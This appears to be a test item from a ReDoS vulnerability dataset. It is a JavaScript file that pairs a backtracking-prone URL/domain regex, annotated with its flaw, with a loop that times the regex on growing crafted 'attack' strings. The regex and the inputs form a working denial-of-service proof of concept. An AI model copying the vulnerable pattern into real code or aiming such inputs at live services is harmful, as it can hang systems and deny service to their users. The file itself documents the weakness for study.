/**
 * vuln pattern: SLQ
 * vuln degree: POL
 * mul vuln: N
 * vuln location: [\d\w\-.]+
 */
var REGEX = /([\d\w\-.]+?\.(a[cdefgilmnoqrstuwz]|b[abdefghijmnorstvwyz]|c[acdfghiklmnoruvxyz]|d[ejkmnoz]|e[ceghrst]|f[ijkmnor]|g[abdefghilmnpqrstuwy]|h[kmnrtu]|i[delmnoqrst]|j[emop]|k[eghimnprwyz]|l[abcikrstuvy]|m[acdghklmnopqrstuvwxyz]|n[acefgilopruz]|om|p[aefghklmnrstwy]|qa|r[eouw]|s[abcdeghijklmnortuvyz]|t[cdfghjkmnoprtvwz]|u[augkmsyz]|v[aceginu]|w[fs]|y[etu]|z[amw]|aero|arpa|biz|com|coop|edu|info|int|gov|mil|museum|name|net|org|pro)(\b|\W(?<!&|=)(?!\.\s|\.{3}).*?))(\s|$)/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '' + 'a'.repeat(i*10000) + '!'
    REGEX.exec(attack_str);
    var time_cost = Date.now() - time;
    console.log("i.length: " + i + ": " + time_cost+" ms")
}